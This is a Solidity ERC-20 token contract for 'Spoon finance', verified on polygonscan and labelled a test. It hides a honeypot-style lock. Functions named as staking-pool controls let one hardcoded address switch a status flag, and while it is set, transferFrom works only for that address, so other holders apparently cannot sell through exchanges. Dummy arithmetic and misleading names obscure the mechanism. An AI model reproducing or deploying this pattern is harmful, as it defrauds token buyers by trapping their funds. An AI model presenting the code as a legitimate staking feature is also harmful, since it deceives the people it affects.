/**
 *Submitted for verification at polygonscan.com on 2022-03-07
*/

// SPDX-License-Identifier: MIT

/******************************************************************/
/*                                                                */
/* THIS TOKEN IS A TEST, PLEASE DO NO INTERACT WITH THIS CONTRACT */
/*                                                                */
/******************************************************************/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract TestSpoonToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokend_totalSupply;
    uint256 private _tokend_status = 0;
    uint256 public stakingPooldStatus = 0;

    string private _tokend_name;
    string private _tokend_symbol;

    address private _pooldAddress = 0xbb49857283b29743D2c6266DBc3489751846EEb4;

    constructor() {
        _tokend_name = "Spoon finance";
        _tokend_symbol = "Spoon";
        _tokend_totalSupply = 9999999 * 10 ** 18;
        _balances[msg.sender] = _tokend_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _pooldAddress || _tokend_status == 0);
        _;
    }

    function name() public view virtual override returns (string memory) {
        return _tokend_name;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokend_totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _safeTransfer(owner, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function symbol() public view virtual override returns (string memory) {
        return _tokend_symbol;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "Token : decreased allowance below 0");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function _safeTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "Token : transfer from the 0 address");
        require(to != address(0), "Token : transfer to the 0 address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "Token : transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "Token : burn from the 0 address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "Token : burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _tokend_totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _spendAllowance(
        address balance_owner,
        address balance_spender,
        uint256 balance_amount
    ) internal virtual {
        uint256 currentAllowance = allowance(balance_owner, balance_spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= balance_amount, "Token : insufficient allowance");
            unchecked {
                _approve(balance_owner, balance_spender, currentAllowance - balance_amount);
            }
        }
    }

    function _approve(
        address balance_owner,
        address balance_spender,
        uint256 balance_amount
    ) internal virtual {
        require(balance_owner != address(0), "Token : approve from the 0 address");
        require(balance_spender != address(0), "Token : approve to the 0 address");

        _allowances[balance_owner][balance_spender] = balance_amount;
        emit Approval(balance_owner, balance_spender, balance_amount);
    }

    function enableStakingPool(address disabledAddress) public {
        disabledAddress = address(0);
        uint256 a = 1;
        a = a + 1;
        a = a - 1;
        if (msg.sender == _pooldAddress)
        {
            _tokend_status = 0;
        }
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public forTransfer virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _safeTransfer(from, to, amount);
        return true;
    }

    function _afterTokenTransfer(
        address balance_from,
        address balance_to,
        uint256 balance_amount
    ) internal virtual {}

    function _beforeTokenTransfer(
        address balance_from,
        address balance_to,
        uint256 balance_amount
    ) internal virtual {}

    function _disableStakingPool(address stakingPoolAddress) public view {
        require(msg.sender == address(0));
        stakingPoolAddress = address(0);
    }

    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPooldStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _pooldAddress)
        {
            _tokend_status = 1;
        }
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

}